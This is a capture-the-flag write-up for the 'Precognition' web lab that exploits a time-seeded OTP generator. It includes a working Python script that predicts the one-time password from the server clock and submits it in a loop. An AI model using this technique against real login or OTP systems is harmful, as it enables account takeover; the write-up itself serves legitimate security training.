---
title: Precognition writeup
date: 2021-10-11
description: "Hello guys script is here and today we will learn in this post how we can own precognition web-lab"
image: images/predictthefuture/predicthefuture.png
alt: precognition
---

## Web-Lab information

### PRECOGNITION

|              |                                                      |
| ------------ | ---------------------------------------------------- |
| Point:       | 20+                                                  |
| Level:       | EASY                                                 |
| Target:      | http://machine9.hacksec.in                           |
| First ownby: | [n00bmast3r](https://www.app.hacksec.in/profile/158) |
| Created by:  | [SCRIPT1337X](https://www.app.hacksec.in/profile/1)  |

## let's start

First of all, let's see what we have to work on by opening the URL.
![HomePage](/images/predictthefuture/1.png)

## Reading source code

Source code is available here : https://machine9.hacksec.in/download/source_code
![Source_code](/images/predictthefuture/2.png)

## Vulnerable function

Send OTP function generates the OTP, and it's vulnerable because it's using the current time as a seed to generate OTP using randint.
![Vulnerable_function](/images/predictthefuture/3.png)

## Finding current server time

If we read the custom_response function, we can see we can get the current server time in the server_time response header
![custom_response](/images/predictthefuture/4.png)
![server_time](/images/predictthefuture/5.png)

## Write exploit
So we have everything, so lets create our exploit now
```bash
from flask import json
import requests
from threading import Thread
from random import seed
from random import randint
import time
import json

data = requests.get("https://machine9.hacksec.in/server/info").headers
server_time = float(data["server_time"])
#print(server_time)
secx = round(time.time() * 1000) / 1000
print(int(secx))
print(int(secx) + 5)
seed(int(secx) + 5)
otp = [9999, 0000]
generated_otp = randint(otp[1], otp[0])
print(generated_otp)
count = 0
while True:
    count += 1
    print("Try for " + str(count))
    data = requests.post("https://machine9.hacksec.in/send/otp", json={"otp": generated_otp}).content
    data = json.loads(data)
    if data["data"] != "Wrong OTP":
        print("[+] OTP sent successfully")
        print(data)
        break
```


## Read hash.txt

Done
![hash.txt](/images/predictthefuture/6.png)
